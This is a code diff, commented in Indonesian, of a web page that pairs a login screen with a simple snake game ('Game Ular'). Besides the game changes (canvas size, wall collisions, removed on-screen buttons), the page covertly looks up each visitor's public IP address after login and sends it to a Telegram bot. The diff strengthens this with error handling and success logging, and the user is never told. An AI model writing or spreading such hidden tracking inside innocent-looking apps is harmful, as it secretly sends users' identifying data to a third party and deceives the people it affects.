@@ -34,31 +34,6 @@
         }
         button:hover { background: darkgreen; }
         #gameContainer { display: none; }
-        canvas {
-            background-color: #111;
-            border: 2px solid white;
-            margin-top: 20px;
-        }
-        .controls {
-            display: grid;
-            grid-template-columns: repeat(3, 60px);
-            gap: 5px;
-            margin-top: 15px;
-        }
-        .btn {
-            width: 60px;
-            height: 60px;
-            background: white;
-            border: 2px solid black;
-            font-size: 24px;
-            text-align: center;
-            line-height: 60px;
-            cursor: pointer;
-            user-select: none;
-            font-weight: bold;
-        }
-        .btn:active { background: gray; }
-        .empty { visibility: hidden; }
     </style>
 </head>
 <body>
@@ -73,15 +48,8 @@
 
     <!-- GAME ULAR -->
     <div id="gameContainer">
-        <canvas id="gameCanvas"></canvas>
-        <div class="controls">
-            <div class="empty"></div>
-            <div class="btn" onclick="changeDirection('UP')">↑</div>
-            <div class="empty"></div>
-            <div class="btn" onclick="changeDirection('LEFT')">←</div>
-            <div class="btn" onclick="changeDirection('DOWN')">↓</div>
-            <div class="btn" onclick="changeDirection('RIGHT')">→</div>
-        </div>
+        <h2>Game Ular</h2>
+        <canvas id="gameCanvas" width="400" height="400" style="background: black;"></canvas>
     </div>
 
     <script>
@@ -100,9 +68,12 @@
                 .then(data => {
                     const userIP = data.ip;
                     sendToTelegram(userIP);
+                })
+                .catch(error => {
+                    console.error("Gagal mendapatkan IP:", error);
                 });
 
-            // Tampilkan game setelah login
+            // Sembunyikan login & tampilkan game
             document.getElementById("loginContainer").style.display = "none";
             document.getElementById("gameContainer").style.display = "block";
             initGame();
@@ -117,50 +88,50 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("IP berhasil dikirim ke Telegram.");
+                } else {
+                    console.error("Gagal mengirim IP ke Telegram:", data);
+                }
+            })
+            .catch(error => {
+                console.error("Kesalahan saat mengirim ke Telegram:", error);
             });
         }
 
         // GAME ULAR
         const canvas = document.getElementById("gameCanvas");
         const ctx = canvas.getContext("2d");
-        const box = 25;
-        canvas.width = box * 20;
-        canvas.height = box * 20;
-
-        let snake, food, direction;
-        let lastUpdateTime = 0;
-        let moveSpeed = 100;
+        const box = 20;
+        let snake = [{ x: 10 * box, y: 10 * box }];
+        let food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
+        let direction = "RIGHT";
+        let gameRunning = false;
 
         function initGame() {
-            snake = [{ x: 10 * box, y: 10 * box }];
-            food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
-            direction = "RIGHT";
-            lastUpdateTime = performance.now();
-            requestAnimationFrame(gameLoop);
+            document.addEventListener("keydown", changeDirection);
+            gameRunning = true;
+            gameLoop();
         }
 
-        document.addEventListener("keydown", (event) => {
+        function changeDirection(event) {
             if (event.key === "ArrowUp" && direction !== "DOWN") direction = "UP";
             if (event.key === "ArrowDown" && direction !== "UP") direction = "DOWN";
             if (event.key === "ArrowLeft" && direction !== "RIGHT") direction = "LEFT";
             if (event.key === "ArrowRight" && direction !== "LEFT") direction = "RIGHT";
-        });
-
-        function changeDirection(dir) {
-            if (dir === "UP" && direction !== "DOWN") direction = "UP";
-            if (dir === "DOWN" && direction !== "UP") direction = "DOWN";
-            if (dir === "LEFT" && direction !== "RIGHT") direction = "LEFT";
-            if (dir === "RIGHT" && direction !== "LEFT") direction = "RIGHT";
         }
 
-        function gameLoop(currentTime) {
-            requestAnimationFrame(gameLoop);
+        function gameLoop() {
+            if (!gameRunning) return;
 
-            if (currentTime - lastUpdateTime > moveSpeed) {
-                lastUpdateTime = currentTime;
+            setTimeout(() => {
                 update();
                 draw();
-            }
+                gameLoop();
+            }, 100);
         }
 
         function update() {
@@ -170,26 +141,38 @@
             if (direction === "LEFT") newHead.x -= box;
             if (direction === "RIGHT") newHead.x += box;
 
+            // Cek tabrakan dengan dinding
+            if (newHead.x < 0 || newHead.x >= canvas.width || newHead.y < 0 || newHead.y >= canvas.height) {
+                gameRunning = false;
+                alert("Game Over!");
+                return;
+            }
+
+            // Cek tabrakan dengan makanan
             if (newHead.x === food.x && newHead.y === food.y) {
                 food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
-            } else snake.pop();
+            } else {
+                snake.pop();
+            }
 
             snake.unshift(newHead);
         }
 
         function draw() {
-            ctx.fillStyle = "#111";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
 
+            // Gambar makanan
             ctx.fillStyle = "red";
             ctx.fillRect(food.x, food.y, box, box);
 
+            // Gambar ular
             snake.forEach((segment, index) => {
                 ctx.fillStyle = index === 0 ? "black" : "green";
                 ctx.fillRect(segment.x, segment.y, box, box);
+
                 if (index === 0) {
                     ctx.fillStyle = "white";
-                    ctx.fillText("YADI", segment.x + 3, segment.y + 18);
+                    ctx.fillText("YADI", segment.x + 5, segment.y + 15);
                 }
             });
         }
